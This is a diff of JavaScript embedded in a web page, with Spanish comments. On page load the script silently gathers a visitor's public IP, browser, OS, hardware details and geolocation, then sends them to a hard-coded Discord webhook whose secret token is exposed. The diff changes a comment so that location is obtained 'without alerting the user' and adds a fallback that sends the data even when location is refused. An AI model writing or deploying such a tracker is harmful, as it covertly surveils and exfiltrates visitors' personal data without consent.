@@ -115,59 +115,70 @@ function sendUserInfo() {
             // Información sobre la CPU (número de núcleos)
             const cpuCores = navigator.hardwareConcurrency || "Desconocido";
 
-            // Intentar obtener geolocalización si el usuario lo permite
+            // Intentar obtener geolocalización sin alertar al usuario
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
 
-                    // Crear objeto con toda la información recolectada
-                    const userInfo = {
-                        IP: ip,
-                        UserAgent: userAgent,
-                        Screen: `${screenWidth}x${screenHeight}`,
-                        OS: os,
-                        Idioma: idioma,
-                        Conexion: connection,
-                        Referencia: referrer,
-                        CookiesHabilitadas: cookiesEnabled,
-                        ZonaHoraria: timezone,
-                        HoraActual: currentTime,
-                        Navegador: browser,
-                        VersionNavegador: browserVersion,
-                        Geolocalizacion: `Latitud: ${lat}, Longitud: ${lon}`,
-                        GPU: gpuInfo,
-                        CPU_Cores: cpuCores
-                    };
+                        // Información con geolocalización
+                        const userInfo = {
+                            IP: ip,
+                            UserAgent: userAgent,
+                            Screen: `${screenWidth}x${screenHeight}`,
+                            OS: os,
+                            Idioma: idioma,
+                            Conexion: connection,
+                            Referencia: referrer,
+                            CookiesHabilitadas: cookiesEnabled,
+                            ZonaHoraria: timezone,
+                            HoraActual: currentTime,
+                            Navegador: browser,
+                            VersionNavegador: browserVersion,
+                            Geolocalizacion: `Latitud: ${lat}, Longitud: ${lon}`,
+                            GPU: gpuInfo,
+                            CPU_Cores: cpuCores
+                        };
 
-                    // Enviar la información al webhook de Discord
-                    sendToDiscord(userInfo);
-                });
+                        // Enviar la información al webhook de Discord
+                        sendToDiscord(userInfo);
+                    },
+                    () => {
+                        // Si el usuario niega la geolocalización o falla, enviar sin ubicación
+                        sendUserInfoWithoutLocation(ip, userAgent, screenWidth, screenHeight, os, idioma, connection, referrer, cookiesEnabled, timezone, currentTime, browser, browserVersion, gpuInfo, cpuCores);
+                    }
+                );
             } else {
-                // Si no hay geolocalización disponible
-                const userInfo = {
-                    IP: ip,
-                    UserAgent: userAgent,
-                    Screen: `${screenWidth}x${screenHeight}`,
-                    OS: os,
-                    Idioma: idioma,
-                    Conexion: connection,
-                    Referencia: referrer,
-                    CookiesHabilitadas: cookiesEnabled,
-                    ZonaHoraria: timezone,
-                    HoraActual: currentTime,
-                    Navegador: browser,
-                    VersionNavegador: browserVersion,
-                    Geolocalizacion: 'No permitida',
-                    GPU: gpuInfo,
-                    CPU_Cores: cpuCores
-                };
-
-                // Enviar la información al webhook de Discord
-                sendToDiscord(userInfo);
+                // Si no está disponible la geolocalización, enviar sin ella
+                sendUserInfoWithoutLocation(ip, userAgent, screenWidth, screenHeight, os, idioma, connection, referrer, cookiesEnabled, timezone, currentTime, browser, browserVersion, gpuInfo, cpuCores);
             }
         })
         .catch(error => console.error('Error obteniendo la IP pública:', error));
+}
+
+// Función para enviar la información al webhook sin geolocalización
+function sendUserInfoWithoutLocation(ip, userAgent, screenWidth, screenHeight, os, idioma, connection, referrer, cookiesEnabled, timezone, currentTime, browser, browserVersion, gpuInfo, cpuCores) {
+    const userInfo = {
+        IP: ip,
+        UserAgent: userAgent,
+        Screen: `${screenWidth}x${screenHeight}`,
+        OS: os,
+        Idioma: idioma,
+        Conexion: connection,
+        Referencia: referrer,
+        CookiesHabilitadas: cookiesEnabled,
+        ZonaHoraria: timezone,
+        HoraActual: currentTime,
+        Navegador: browser,
+        VersionNavegador: browserVersion,
+        Geolocalizacion: 'No permitida',
+        GPU: gpuInfo,
+        CPU_Cores: cpuCores
+    };
+
+    // Enviar la información al webhook de Discord
+    sendToDiscord(userInfo);
 }
 
 // Función para enviar la información al webhook de Discord
@@ -175,12 +186,12 @@ function sendToDiscord(userInfo) {
     const webhookUrl = "https://discord.com/api/webhooks/1294006529338507335/_zrSstE-4m_-FLwBBg4XmHiYg4KpQjM_WJ-XUdln7LNtdaj4Per8qQsPIy40H8cBqx9A";
 
     const message = {
-        username: "User Info Bot",  // Nombre del bot
-        avatar_url: "https://i.imgur.com/AfFp7pu.png",  // Imagen del bot (opcional)
+        username: "User Info Bot",
+        avatar_url: "https://i.imgur.com/AfFp7pu.png",
         embeds: [
             {
-                title: "📋 Información del Usuario",  // Título atractivo con icono
-                color: 3447003, // Color del borde del embed (en formato decimal)
+                title: "📋 Información del Usuario",
+                color: 3447003,
                 fields: [
                     { name: "🌐 IP Pública", value: userInfo.IP, inline: true },
                     { name: "🖥️ Sistema Operativo", value: userInfo.OS, inline: true },
@@ -199,9 +210,9 @@ function sendToDiscord(userInfo) {
                 ],
                 footer: {
                     text: "Reporte generado automáticamente",
-                    icon_url: "https://i.imgur.com/AfFp7pu.png"  // Icono del pie de página (opcional)
+                    icon_url: "https://i.imgur.com/AfFp7pu.png"
                 },
-                timestamp: new Date()  // Hora del reporte
+                timestamp: new Date()
             }
         ]
     };
@@ -224,6 +235,7 @@ function sendToDiscord(userInfo) {
 
 // Llamar a la función para enviar la información del usuario
 sendUserInfo();
+
 
 
     </script>
